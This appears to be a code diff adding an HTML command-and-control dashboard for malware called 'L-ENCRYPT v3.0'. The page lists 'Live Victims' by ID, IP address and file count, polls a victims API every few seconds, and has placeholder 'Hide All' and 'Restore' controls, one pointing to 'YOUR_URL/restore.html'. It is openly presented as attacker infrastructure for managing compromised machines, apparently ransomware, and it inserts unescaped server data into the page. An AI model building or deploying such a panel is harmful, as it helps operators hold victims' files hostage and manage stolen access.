@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>L-ENCRYPT C2</title>
+    <style>
+        body{font-family:Arial;background:#111;color:#0f0;margin:0;padding:20px;}
+        table{width:100%;border-collapse:collapse;margin-top:20px;}
+        th,td{border:1px solid #0f0;padding:10px;text-align:left;}
+        button{background:#0f0;color:#000;border:none;padding:8px 12px;cursor:pointer;}
+    </style>
+</head>
+<body>
+    <h1>L-ENCRYPT v3.0 — Live Victims</h1>
+    <div id="victims"></div>
+
+<script>
+function refresh() {
+    fetch('/api/victims').then(r => r.json()).then(data => {
+        let html = "<table><tr><th>ID</th><th>IP</th><th>Files</th><th>Actions</th></tr>";
+        for (let id in data) {
+            let v = data[id];
+            html += `<tr>
+                <td>${v.id}</td>
+                <td>${v.ip}</td>
+                <td>${v.files.length}</td>
+                <td>
+                    <button onclick="alert('Hide command sent')">Hide All</button>
+                    <button onclick="alert('Unhide link: YOUR_URL/restore.html')">Restore</button>
+                </td>
+            </tr>`;
+        }
+        html += "</table>";
+        document.getElementById("victims").innerHTML = html;
+    });
+}
+setInterval(refresh, 3000); refresh();
+</script>
+</body>
+</html>
